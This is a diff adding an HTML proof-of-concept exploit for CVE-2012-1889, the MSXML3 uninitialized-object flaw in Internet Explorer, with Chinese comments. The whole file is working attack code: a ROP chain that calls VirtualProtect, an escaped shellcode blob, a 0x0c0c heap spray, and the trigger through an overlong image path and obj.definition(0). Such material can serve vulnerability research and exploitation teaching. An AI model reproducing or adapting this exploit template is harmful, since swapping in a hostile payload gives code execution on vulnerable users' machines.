@@ -1,0 +1,49 @@
+<html>
+
+<head>
+    <title>CVE 2012-1889 PoC</title>
+</head>
+
+<body>
+    <object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id='poc'></object>
+    <h1>66666</h1>asdasd
+    <script>
+        //"clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4"是MSXML3.dll中使用到的ID
+        var shellcode = "\u17a3\u770f" + // ret 8 770F17A3
+            "\ubb7c\u77be" + // pop ebp ret 0x77BEBB7C
+            "\u0e49\u7c83" + // xchg eax,esp;ret 0x7C830E4a 
+            "\u9090\u9090" +
+            "\u0c20\u0c0c" +	// ebp value
+            "\u1ad9\u7c80" + // VirtualProtect 0x7c801ad9
+            "\u0e4a\u7c83" + // call [ecx+0x18] ret 0x7C830E49
+            //	"\u9090\u9090"+ 
+            "\u0c38\u0c0c" + // Param address
+            "\u1000\u0000" + // Param Size
+            "\u0040\u0000" + // Param Protect 0x40
+            "\u0c0c\u0c00"  // Old Protect                
+            ;
+        shellcode += "\u68FC\u0A6A\u1E38\u6368\uD189\u684F\u7432\u0C91\uF48B\u7E8D\u33F4\uB7DB\u2B04\u66E3\u33BB\u5332\u7568\u6573\u5472\uD233\u8B64\u305A\u4B8B\u8B0C\u1C49\u098B\u698B\uAD08\u6A3D\u380A\u751E\u9505\u57FF\u95F8\u8B60\u3C45\u4C8B\u7805\uCD03\u598B\u0320\u33DD\u47FF\u348B\u03BB\u99F5\uBE0F\u3A06\u74C4\uC108\u07CA\uD003\uEB46\u3BF1\u2454\u751C\u8BE4\u2459\uDD03\u8B66\u7B3C\u598B\u031C\u03DD\uBB2C\u5F95\u57AB\u3D61\u0A6A\u1E38\uA975\uDB33\u6853\u6577\u7473\u6668\u6961\u8B6C\u53C4\u5050\uFF53\uFC57\uFF53\uF857";
+        var var_C = unescape("%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c");
+        while (var_C.length + 20 + 8 < 65536) var_C += var_C;
+        var_D = var_C.substring(0, (0x0c0c - 0x24) / 2);
+        var_D += shellcode;	// 拼接shellcode
+        var_D += var_C;		// 拼接滑块代码
+        var_E = var_D.substring(0, 65536 / 2);
+        while (var_E.length < 0x80000) var_E += var_E;
+        var_H = var_E.substring(0, 0x80000 - (0x1020 - 0x08) / 2); // 7F7F4
+        var var_F = new Array();
+        for (var_G = 0; var_G < 0x1f0; var_G++) var_F[var_G] = var_H.substr(0, var_H.length) + "s";
+
+        var obj = document.getElementById('poc').object;//获取obj对象，类id为"msxml3"，对象id为"poc"
+        var src = unescape("%u0c08%u0c0c");             //0c0c
+        while (src.length < 0x1002) src += src;         //循环拼接路径
+        src = "\\\\xxx" + src;                          //拼接路径
+        src = src.substr(0, 0x1000 - 10);				//截断最后10字符
+        var pic = document.createElement("img");        //创建图片元素pic
+        pic.src = src;                                  //图片元素pic的路径赋值，路径是0xFF6字节的0c0c0c0c，将会溢出栈空间
+        pic.nameProp;
+        obj.definition(0);                              //定义并初始化一个空的对象
+    </script>
+</body>
+
+</html>
